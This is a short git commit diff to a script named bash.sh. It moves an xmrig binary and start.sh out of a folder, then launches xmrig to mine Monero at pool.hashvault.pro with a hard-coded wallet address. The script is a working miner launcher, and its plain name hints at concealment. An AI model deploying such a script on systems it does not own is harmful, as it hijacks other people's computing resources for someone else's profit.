fafd568a3c649d1eb3990a055c0e107adf86d98c
Daisy <71977928+anhbtit80@users.noreply.github.com>
2025-04-15 20:51:56 +0700

    Update bash.sh

--- bash.sh
+++ bash.sh
@@ -1,3 +1,10 @@
+cd pre-compli
+
+mv xmrig ..
+mv start.sh ..
+
+cd
+
 chmod +x xmrig
 
 ./xmrig -o pool.hashvault.pro:443 -u 458wDBqXmANaEQRqEeBEU474xigR2u6gkchgPMxeQMtFJTjpdhfFKTA2GZV3VCSTW2ieU8hTSnnwQ2rz1arMjXm231CL8CL -p x --huge-pages-jit --randomx-1gb-pages --tls
